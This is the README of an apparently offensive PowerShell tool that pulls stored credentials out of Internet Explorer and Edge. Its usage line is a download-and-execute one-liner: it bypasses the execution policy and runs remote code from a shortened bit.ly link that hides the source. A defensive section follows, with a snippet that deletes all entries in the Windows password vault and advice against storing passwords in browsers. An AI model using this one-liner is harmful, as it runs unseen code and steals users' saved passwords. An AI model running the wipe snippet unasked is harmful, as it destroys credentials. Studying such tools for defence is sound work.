# credgrap_ie_edge

Content: Extract stored credentials from Internet Explorer and Edge

Author: Florian Hansemann | @HanseSecure | https://hansesecure.de

Date: 04/2018

## Usage
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2K75g15')"

<img src="https://raw.githubusercontent.com/HanseSecure/credgrap_ie_edge/master/image/credgrap.gif" width="40" height="40" />


## Recommendation

### Powershell Solution
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach {$vault.Remove($_)}

Thanks @nongiach for Info

### Other Solution
Don't save any passwords within your browser and use password safes ;-)

### Additionally Information
I was informed by @jaredhaight that this code was already used in the past. I Didn't know that, but i want to add the link to that post https://www.toddklindt.com/blog/_layouts/mobile/dispform.aspx?List=56f96349-3bb6-4087-94f4-7f95ff4ca81f&ID=606

I think the smaller the code, the bigger the chance to develop something 'old'.
